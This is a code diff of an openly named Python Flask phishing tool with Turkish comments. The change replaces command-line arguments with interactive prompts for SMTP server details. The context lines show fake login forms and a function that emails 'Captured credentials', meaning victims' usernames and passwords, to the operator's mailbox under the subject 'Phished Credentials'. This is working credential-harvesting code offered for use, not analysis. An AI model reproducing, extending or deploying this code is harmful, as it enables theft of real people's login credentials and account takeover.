@@ -3,24 +3,18 @@ import smtplib
 from email.mime.text import MIMEText
 import logging
 from flask import Flask, request, render_template_string, redirect, url_for
-import argparse
 
 app = Flask(__name__)
 
-# Komut satırı argümanları
-def parse_args():
-    parser = argparse.ArgumentParser(description='Phishing tool configuration.')
-    parser.add_argument('--smtp-server', type=str, required=True, help='SMTP server address')
-    parser.add_argument('--smtp-port', type=int, required=True, help='SMTP server port')
-    parser.add_argument('--smtp-user', type=str, required=True, help='SMTP username')
-    parser.add_argument('--smtp-password', type=str, required=True, help='SMTP password')
-    parser.add_argument('--log-file', type=str, default='phishing.log', help='Log file path')
-    return parser.parse_args()
-
-args = parse_args()
+# Kullanıcıdan gerekli bilgileri alma
+smtp_server = input("SMTP server address: ")
+smtp_port = int(input("SMTP server port: "))
+smtp_user = input("SMTP username: ")
+smtp_password = input("SMTP password: ")
+log_file = input("Log file path (default: phishing.log): ") or 'phishing.log'
 
 # Logging yapılandırması
-logging.basicConfig(filename=args.log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Sahte giriş formları
 login_forms = {
@@ -112,13 +106,13 @@ def send_email(username, password):
     try:
         msg = MIMEText(f"Captured credentials:\nUsername: {username}\nPassword: {password}")
         msg['Subject'] = 'Phished Credentials'
-        msg['From'] = args.smtp_user
-        msg['To'] = args.smtp_user
+        msg['From'] = smtp_user
+        msg['To'] = smtp_user
 
-        with smtplib.SMTP(args.smtp_server, args.smtp_port) as server:
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
             server.starttls()
-            server.login(args.smtp_user, args.smtp_password)
-            server.sendmail(args.smtp_user, [args.smtp_user], msg.as_string())
+            server.login(smtp_user, smtp_password)
+            server.sendmail(smtp_user, [smtp_user], msg.as_string())
     except Exception as e:
         logging.error(f"Failed to send email: {e}")
 
